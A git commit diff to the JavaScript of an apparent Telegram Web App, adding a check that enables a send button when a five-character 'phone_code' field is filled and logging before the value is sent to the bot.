69c05c47f3cf62e0667bd7d3542a4473b34c5924
Ubica228 <122717010+Ubica228@users.noreply.github.com>
2023-01-20 21:47:11 +0500

    Add files via upload

--- js.js
+++ js.js
@@ -3,8 +3,19 @@ tg.expand();
 
 phone = document.getElementById('phone_code') ;
 send_btn = document.getElementById('send-button');
+
+function CheckIf(){
+    console.log(phone.value.length);
+    if (phone.value.length == 5){
+       send_btn.disabled = false;
+    }
+    else{
+        send_btn.disabled = true;
+    }
+}
+
 send_btn.addEventListener('click',function(){
- 
+    console.log('as');
     tg.sendData(phone.value);
     
 });
